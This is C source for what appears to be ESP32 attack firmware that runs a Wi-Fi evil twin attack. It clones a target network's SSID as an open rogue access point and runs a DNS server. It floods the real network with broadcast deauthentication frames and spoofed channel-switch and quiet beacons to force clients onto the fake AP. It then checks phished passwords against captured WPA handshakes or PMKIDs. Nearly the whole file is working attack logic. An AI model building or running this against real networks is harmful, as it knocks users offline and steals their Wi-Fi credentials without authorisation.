#include <string.h>
#include <stdlib.h>
#include <esp_log.h>
#include <esp_timer.h>
#include "wifiMng.h"
#include "evil_twin.h"
#include "aircrack.h"
#include "sniffer.h"
#include "dns.h"
#include "wifi_attacks.h"
#include "server_api.h"
#include "TaskManager.h"


#define EVIL_TWIN_TASK_PRIO 5
#define CHANNEL_SWITCH_DELAY 15   // Channel switch assestment time
#define ATTACK_WINDOW        75  // RCO duration
#define SOFTAP_REST_TIME     300   // Home channel time
#define SCAN_INTERVAL_US     30000000 // 30 seconds

/* Store target information */
static const char *TAG = "EVIL_TWIN";
static TaskHandle_t evil_twin_task_handle = NULL;
static volatile bool evil_twin_running = false;
static EventGroupHandle_t evil_twin_evt = NULL;
#define EVILTWIN_EXIT_BIT (1 << 0)

/* Evil Twin Attack Status Strings */
static const char* evil_twin_attack_status_string[EVIL_TWIN_ATTACK_STATUS_MAX] = {
    "EVIL_TWIN_ATTACK_STATUS_IDLE",
    "EVIL_TWIN_ATTACK_STATUS_ACTIVE"
};

/* Evil Twin Status Information */
static evil_twin_attack_status_info_t evil_twin_status = { 0 };

static void evil_twin_task(void *pvParameters)
{
    vTaskDelay(pdMS_TO_TICKS(1000));

    /* aps_info_light_t is ~1.9 KB (35 x ap_ext_light_t). Keeping it on the
     * task stack, together with wifi_config_t and the deep scan/log call
     * chains, overflowed the 4 KB task stack and rebooted the device. Move
     * the big buffers to the heap and give the task a larger stack instead. */
    aps_info_light_t *aps = calloc(1, sizeof(aps_info_light_t));
    if (aps == NULL) {
        ESP_LOGE(TAG, "evil_twin: out of memory for AP scan buffer");
        task_manager_unregister_current_task();
        vTaskDelete(NULL);
        return;
    }

    /* Get target information */
    target_info_t *target = target_get(TARGET_INFO_EVIL_TWIN);
    target_info_t twin_on_5ghz = {0};

    /*Try guess by ssid */
    target->vendor = getVendor((char *)&target->ssid);

    /* Clone Access Point.
     *
     * The C5 is dual-band, so a 5GHz target SHOULD be clonable on its own
     * channel. The old code copied target->channel verbatim and, when that
     * failed, silently forced channel 6 while the AP stayed pinned to the
     * 2.4GHz band - the rogue AP then never appeared on the channel the
     * victim's 5GHz clients were scanning.
     *
     * Strategy:
     *   1. Put the radio in dual-band mode so both bands are available.
     *   2. Try to clone on the target's real channel (2.4G or 5G).
     *   3. Only if the driver rejects that config, fall back to a known-good
     *      2.4GHz channel and clone again. */
    wifi_mode_t cur_mode = WIFI_MODE_NULL;
#if CONFIG_SOC_WIFI_SUPPORT_5G
    /* Dual-band parts (C5) can host the rogue AP on either band. Single-band
       parts don't have this API, so only touch it when the SoC supports 5G. */
    if (esp_wifi_get_mode(&cur_mode) == ESP_OK &&
        (cur_mode == WIFI_MODE_AP || cur_mode == WIFI_MODE_APSTA)) {
        esp_err_t bm = esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
        if (bm != ESP_OK) {
            ESP_LOGW(TAG, "Could not enable dual-band mode (%s); continuing", esp_err_to_name(bm));
        }
    }
#else
    (void)cur_mode;
#endif

    uint8_t ap_channel = target->channel;
    if (ap_channel == 0) ap_channel = 6;   /* unknown -> safe 2.4G default */

    wifi_config_t *wifi_config = calloc(1, sizeof(wifi_config_t));
    if (wifi_config == NULL) {
        ESP_LOGE(TAG, "evil_twin: out of memory for wifi_config");
        free(aps);
        task_manager_unregister_current_task();
        vTaskDelete(NULL);
        return;
    }
    wifi_config->ap.channel = ap_channel;
    wifi_config->ap.max_connection = 8;
    wifi_config->ap.authmode = WIFI_AUTH_OPEN;
    wifi_config->ap.pmf_cfg.required = false;
    wifi_config->ap.pmf_cfg.capable = false;
    /* ap.ssid is 32 bytes, target->ssid is 33 (may be a full 32-char name);
       bound the copy to the destination field to avoid a 1-byte overflow. */
    strlcpy((char *)wifi_config->ap.ssid, (char *)target->ssid, sizeof(wifi_config->ap.ssid));
    wifi_config->ap.ssid_len = strlen((char *)wifi_config->ap.ssid);

    esp_err_t clone_err = wifi_ap_clone(wifi_config, NULL);
    if (clone_err != ESP_OK && ap_channel > 14) {
        /* 5GHz channel rejected by the driver - fall back to 2.4GHz so the
           attack still has a beacon on the air. */
        ESP_LOGW(TAG, "5GHz channel %u rejected (%s); falling back to 2.4GHz ch 6",
                 ap_channel, esp_err_to_name(clone_err));
        ws_log(TAG, "5GHz ch %u unsupported, rogue AP moved to 2.4GHz ch 6", ap_channel);
        wifi_config->ap.channel = 6;
        clone_err = wifi_ap_clone(wifi_config, NULL);
    }
    if (clone_err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to start rogue AP: %s", esp_err_to_name(clone_err));
        ws_log(TAG, "Rogue AP failed to start: %s", esp_err_to_name(clone_err));
        evil_twin_status.current_status = EVIL_TWIN_ATTACK_STATUS_IDLE;
        evil_twin_running = false;
        if (evil_twin_evt != NULL) {
            xEventGroupSetBits(evil_twin_evt, EVILTWIN_EXIT_BIT);
        }
        free(wifi_config);
        free(aps);
        task_manager_unregister_current_task();
        vTaskDelete(NULL);
        return;
    }
    ESP_LOGI(TAG, "Rogue AP cloned SSID %s on channel %u", (char *)target->ssid,
             wifi_config->ap.channel);
    /* wifi_config is not needed after cloning */
    free(wifi_config);
    wifi_config = NULL;

    /* Wait AP to be cloned */
    vTaskDelay(pdMS_TO_TICKS(2000));
    /* Start sniffer and beacon tracking */
    wifi_sniffer_set_bssid_filter(target->bssid);
    wifi_start_sniffing();

    /* NOTE: wifi_sniffer_scan_fill_aps utilize a mutex initialized with wifi_start_sniffing*/
    /* Try to find 5ghz twin AP */
    if(wifi_sniffer_scan_fill_aps() == ESP_OK) {
        if(wifi_sniffer_get_aps_light(aps) == ESP_OK) {
            /* Search in scanned aps */
            for(uint8_t i = 0; i < aps->count; i++) {
                /* Found same AP on 5ghz */
                if( (aps->ap[i].primary > 14) && (strcmp((char *)aps->ap[i].ssid, (char *)target->ssid) == 0) ) {
                    twin_on_5ghz.attack_scheme = target->attack_scheme;
                    twin_on_5ghz.authmode = aps->ap[i].authmode;
                    twin_on_5ghz.channel = aps->ap[i].primary;
                    twin_on_5ghz.group_cipher = aps->ap[i].group_cipher;
                    twin_on_5ghz.pairwise_cipher = aps->ap[i].pairwise_cipher;
                    twin_on_5ghz.rssi = aps->ap[i].rssi;
                    twin_on_5ghz.vendor = target->vendor;
                    memcpy(twin_on_5ghz.ssid, aps->ap[i].ssid, sizeof(aps->ap[i].ssid));
                    memcpy(twin_on_5ghz.bssid, aps->ap[i].bssid, sizeof(aps->ap[i].bssid));
                    target_set(&twin_on_5ghz, TARGET_INFO_EVIL_TWIN_5G);
                    evil_twin_status.has_5ghz_target = true;
                    ESP_LOGI(TAG, "Found twin target on 5GHz (Ch: %d).", twin_on_5ghz.channel);
                    ws_log(TAG, "Found twin target on 5GHz (Ch: %d).", twin_on_5ghz.channel);
                    break;
                }
            }
        }
    }

    /* Periodic scan for target tracking */
    int64_t last_scan_time = esp_timer_get_time();
    esp_err_t frame_send_err = ESP_OK;

    /* Clone-only mode just stands the fake AP up and leaves the real one (and
       its clients) alone: no deauth, no CSA/quiet beacons. */
    bool clone_only = (target->attack_mode == TARGET_ATTACK_CLONE_ONLY);
    /* broadcast dest is the default inside wifi_attack_deauth_basic() */

    if (clone_only) {
        ESP_LOGI(TAG, "Clone-only mode: rogue AP up, not transmitting attacks.");
        ws_log(TAG, "Clone-only: clients are NOT being kicked");
    }

    /* ESP32-C5 can only inject standard 0xC0 deauth frames on the 2.4GHz
       band; on 5GHz esp_wifi_80211_tx rejects them ("unsupport frame type:
       0c0"). So we send 0xC0 only when the target is a 2.4GHz channel and
       rely on the CSA/Quiet beacon (an 0x80 beacon frame, accepted on both
       bands) for 5GHz. */
    bool target_is_2g = (target->channel >= 1 && target->channel <= 14);

    while(evil_twin_running)
    {
        if (!clone_only && target_is_2g) {
            /* Standard broadcast deauth on 2.4GHz (dest defaults to FF..FF). */
            for(uint8_t burst = 0; burst < 15; burst++) {
                frame_send_err = wifi_attack_deauth_basic(NULL, target->bssid, 7);
                if(frame_send_err == ESP_OK) {
                    evil_twin_status.deauth_sent++;
                    vTaskDelay(pdMS_TO_TICKS(2));
                }
            }

            /* CSA / Quiet / TPC spoofed beacons (0x80), 2.4GHz target. */
            for(uint8_t burst = 0; burst < 15; burst++) {
                frame_send_err = wifi_attack_deauth_client_negative_tx_power(target->bssid, target->channel, (char *)&target->ssid);
                if(frame_send_err == ESP_OK) {
                    evil_twin_status.packet_sent_2ghz++;
                    vTaskDelay(pdMS_TO_TICKS(2));
                }
            }
        }

        /* 5GHz twin: CSA/Quiet beacon only (C5 rejects 0xC0 deauth on 5GHz).
         *
         * Channel handling matters a lot here. The rogue AP and the STA share
         * ONE radio. remain_on_channel() to a different 5GHz channel yanks the
         * radio off the AP's channel and every connected client sees reason=8
         * / reason=2 drop-and-reconnect churn (the disconnect/connect pair in
         * the logs). So:
         *   - If we did NOT clone on 5GHz (AP is on 2.4GHz), we do have to hop
         *     to the 5GHz twin channel to hit it - unavoidable, clients drop,
         *     that IS the intended "kick them off 2.4GHz" motion.
         *   - If the AP is ALREADY on 5GHz (we cloned a 5GHz target), stay put:
         *     send the CSA/quiet beacon on the current channel so the AP keeps
         *     beaconing and clients do not churn. */
        if(!clone_only && evil_twin_status.has_5ghz_target == true ) {
            bool ap_already_5g = (ap_channel > 14);
            if (ap_already_5g) {
                /* No RF move: target the twin SSID/BSSID on the channel we are
                   already on. */
                uint8_t cur_primary = ap_channel;
                wifi_second_chan_t cur_sec;
                esp_wifi_get_channel(&cur_primary, &cur_sec);
                for(uint8_t burst = 0; burst < 15; burst++) {
                    frame_send_err = wifi_attack_deauth_client_negative_tx_power(twin_on_5ghz.bssid, cur_primary, (char *)&twin_on_5ghz.ssid);
                    if(frame_send_err == ESP_OK) {
                        evil_twin_status.packet_sent_5ghz++;
                        vTaskDelay(pdMS_TO_TICKS(2));
                    }
                }
            } else if(wifi_set_temporary_channel(twin_on_5ghz.channel, ATTACK_WINDOW) == ESP_OK) {
                vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY));
                for(uint8_t burst = 0; burst < 15; burst++) {
                    frame_send_err = wifi_attack_deauth_client_negative_tx_power(twin_on_5ghz.bssid, twin_on_5ghz.channel, (char *)&twin_on_5ghz.ssid);
                    if(frame_send_err == ESP_OK) {
                        evil_twin_status.packet_sent_5ghz++;
                        vTaskDelay(pdMS_TO_TICKS(2));
                    }
                }
            }
        }

        /* Periodic scan for target tracking */
        if (esp_timer_get_time() - last_scan_time > SCAN_INTERVAL_US) 
        {
            if(wifi_sniffer_scan_fill_aps_fast() == ESP_OK) {
                if(wifi_sniffer_get_aps_light(aps) == ESP_OK) {
                    bool found_2g_now = false;

                    /* When one SSID is served by several APs (a campus mesh
                       is the usual case) the scan returns them in a different
                       order every pass. The old loop compared the running
                       channel against whatever row came up and rewrote it each
                       time, so the radio bounced 48 -> 153 -> 161 -> 48 and
                       the beacon on the operating channel got starved. We now
                       lock onto the FIRST matching BSSID and only follow that
                       one; other rows of the same SSID are ignored. */
                    for(uint8_t i = 0; i < aps->count; i++) {
                        bool same_ssid = (strcmp((char *)aps->ap[i].ssid, (char *)target->ssid) == 0);
                        if (!same_ssid) continue;

                        if (aps->ap[i].primary <= 14) {
                            /* Track the 2.4GHz radio of the SAME BSSID we
                               latched onto; if we have not latched yet, any
                               2.4GHz row of this SSID is a valid home channel. */
                            if (!evil_twin_status.has_5ghz_target &&
                                memcmp(target->bssid, aps->ap[i].bssid, 6) != 0) {
                                memcpy(target->bssid, aps->ap[i].bssid, 6);
                            }
                            if (memcmp(target->bssid, aps->ap[i].bssid, 6) == 0) {
                                found_2g_now = true;
                                if (target->channel != aps->ap[i].primary) {
                                    ESP_LOGW(TAG, "TARGET 2.4GHz SWITCHED CHANNEL: %d -> %d", target->channel, aps->ap[i].primary);
                                    ws_log(TAG, "Target 2.4GHz moved to Ch %d", aps->ap[i].primary);
                                    target->channel = aps->ap[i].primary;
                                    wifi_switch_ap_channel_csa(target->channel);
                                }
                            }
                        }
                        else {
                            if (!evil_twin_status.has_5ghz_target) {
                                /* Latch the first 5GHz BSSID and never switch
                                   to a sibling AP of the same SSID. */
                                evil_twin_status.has_5ghz_target = true;
                                twin_on_5ghz.attack_scheme = target->attack_scheme;
                                twin_on_5ghz.authmode = aps->ap[i].authmode;
                                twin_on_5ghz.channel = aps->ap[i].primary;
                                twin_on_5ghz.group_cipher = aps->ap[i].group_cipher;
                                twin_on_5ghz.pairwise_cipher = aps->ap[i].pairwise_cipher;
                                twin_on_5ghz.rssi = aps->ap[i].rssi;
                                twin_on_5ghz.vendor = target->vendor;
                                memcpy(twin_on_5ghz.bssid, aps->ap[i].bssid, 6);
                                memcpy(twin_on_5ghz.ssid, aps->ap[i].ssid, sizeof(aps->ap[i].ssid));
                                target_set(&twin_on_5ghz, TARGET_INFO_EVIL_TWIN_5G);
                                ESP_LOGI(TAG, "New 5GHz target found on Ch %d (locked BSSID)", aps->ap[i].primary);
                            }
                            else if (memcmp(twin_on_5ghz.bssid, aps->ap[i].bssid, 6) == 0 &&
                                     twin_on_5ghz.channel != aps->ap[i].primary) {
                                /* Same BSSID genuinely roamed to another
                                   channel - follow it. */
                                ESP_LOGW(TAG, "TARGET 5GHz SWITCHED CHANNEL: %d -> %d", twin_on_5ghz.channel, aps->ap[i].primary);
                                ws_log(TAG, "Target 5GHz moved to Ch %d", aps->ap[i].primary);
                                twin_on_5ghz.channel = aps->ap[i].primary;
                                target_set(&twin_on_5ghz, TARGET_INFO_EVIL_TWIN_5G);
                            }
                        }
                    }
                    if(!found_2g_now) ESP_LOGW(TAG, "Lost track of 2.4GHz target in this scan.");
                }
            }
            last_scan_time = esp_timer_get_time();
        }
        vTaskDelay(pdMS_TO_TICKS(SOFTAP_REST_TIME)); 
    }
    free(aps);
    if(evil_twin_evt != NULL) {
        xEventGroupSetBits(evil_twin_evt, EVILTWIN_EXIT_BIT);
    }
    task_manager_unregister_current_task();
    vTaskDelete(NULL);
}


void evil_twin_start_attack(const target_info_t *targe_info)
{
    if( evil_twin_task_handle != NULL )
    {   
        ESP_LOGE(TAG, "EvilTwin task already started.");
        return;
    }

    if (evil_twin_evt == NULL) {
        evil_twin_evt = xEventGroupCreate();
    }
    xEventGroupClearBits(evil_twin_evt, EVILTWIN_EXIT_BIT);

    /* Reset status information */
    memset(&evil_twin_status, 0, sizeof(evil_twin_attack_status_info_t));

    /* Start DNS Server */
    dns_server_start();
    /* Start EvilTwin Task */
    target_set(targe_info, TARGET_INFO_EVIL_TWIN);
    evil_twin_running = true;
    task_manager_create_task(evil_twin_task, "evil_twin_task", 8192, NULL, EVIL_TWIN_TASK_PRIO, &evil_twin_task_handle);

    evil_twin_status.current_status = EVIL_TWIN_ATTACK_STATUS_ACTIVE;
    ESP_LOGI(TAG, "Evil-Twin attack started.");
    ESP_LOGI(TAG, "TARGET: %s on Channel %d.", target_get(TARGET_INFO_EVIL_TWIN)->ssid, target_get(TARGET_INFO_EVIL_TWIN)->channel);
}


void evil_twin_stop_attack(void)
{
    if (evil_twin_task_handle == NULL)
    {
        ESP_LOGE(TAG, "EvilTwin task is not running.");
        return;
    }

    /* Signal task to stop and wait */
    evil_twin_running = false;

    if (evil_twin_evt != NULL) {
        xEventGroupWaitBits(evil_twin_evt, EVILTWIN_EXIT_BIT, pdTRUE, pdFALSE, portMAX_DELAY);
        vEventGroupDelete(evil_twin_evt);
        evil_twin_evt = NULL;
    }

    evil_twin_task_handle = NULL;

    /* Stop DNS Server */
    dns_server_stop();
    /* Stop sniffer */
    wifi_stop_sniffing();
    /* Wait engine stop */
    vTaskDelay(pdMS_TO_TICKS(1000));
    /* Restore original hotspot */
    wifi_start_softap();

    evil_twin_status.current_status = EVIL_TWIN_ATTACK_STATUS_IDLE;
    ESP_LOGI(TAG, "Evil-Twin attack stopped.");
}


bool evil_twin_check_password(char *password)
{
    handshake_info_t handshake = {0};
    const target_info_t target = *target_get(TARGET_INFO_EVIL_TWIN);
    
    if(wifi_sniffer_get_handshake_for_target(target.bssid, NULL, &handshake) != ESP_OK) return false;

    if( handshake.handshake_captured)
    {
        return verify_password(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake.mac_sta, handshake.anonce, handshake.snonce, handshake.eapol_m2, handshake.eapol_m2_len, handshake.mic, handshake.key_decriptor_version);
    }
    if( handshake.pmkid_captured)
    {
        return verify_pmkid(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake.mac_sta, handshake.pmkid);
    }
    
    return false;
}


evil_twin_attack_status_t evil_twin_attack_get_status(void) 
{
    return evil_twin_status.current_status;
}


const char* evil_twin_attack_get_status_string(void)
{
    if(evil_twin_status.current_status >= EVIL_TWIN_ATTACK_STATUS_MAX || evil_twin_status.current_status < 0) {
        return "ERROR";
    }
    return evil_twin_attack_status_string[evil_twin_status.current_status];
}


const evil_twin_attack_status_info_t* evil_twin_attack_get_status_info(void) {
    return &evil_twin_status;
}